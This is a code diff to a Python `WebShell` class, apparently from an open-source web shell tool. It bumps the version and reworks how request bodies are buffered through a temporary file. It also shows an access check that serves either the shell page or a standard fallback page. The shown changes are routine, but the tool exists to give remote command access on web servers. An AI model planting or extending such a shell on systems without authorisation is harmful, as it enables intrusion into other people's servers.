@@ -29,6 +29,7 @@ from socket import gethostname, gethostbyname
 from wsgiref.simple_server import make_server
 from collections.abc import Callable
 from sys import getdefaultencoding
+from tempfile import TemporaryFile
 from typing import List, TypeVar
 from base64 import b64encode
 from getpass import getuser
@@ -40,7 +41,7 @@ import html
 import sys
 import re
 
-__version__ = "1.0.3"
+__version__ = "1.1.0"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -408,11 +409,17 @@ class WebShell:
         else:
             content_size = 0
 
+        self.content = TemporaryFile()
+
         if self.type == "cgi":
             self.body = sys.stdin.read(content_size)
+            sys.stdin = self.content
         elif self.type == "wsgi":
             self.body = self.environ["wsgi.input"].read(content_size)
+            self.environ["wsgi.input"] = self.content
 
+        self.content.write(self.body)
+        self.content.seek(0)
         return self.body
 
     def get_access(self) -> bool:
@@ -462,13 +469,16 @@ class WebShell:
 
         if self.get_access():
             self.get_webshell_page()
-            return self.send_page()
+            page = self.send_page()
         else:
-            return (
+            page = (
                 self.standard_page()
                 if self.type == "cgi"
                 else self.standard_page(self.environ, self.responder)
             )
+
+        self.content.close()
+        return page
 
     def run(
         self, environ: _Environ = None, responder: Callable = None
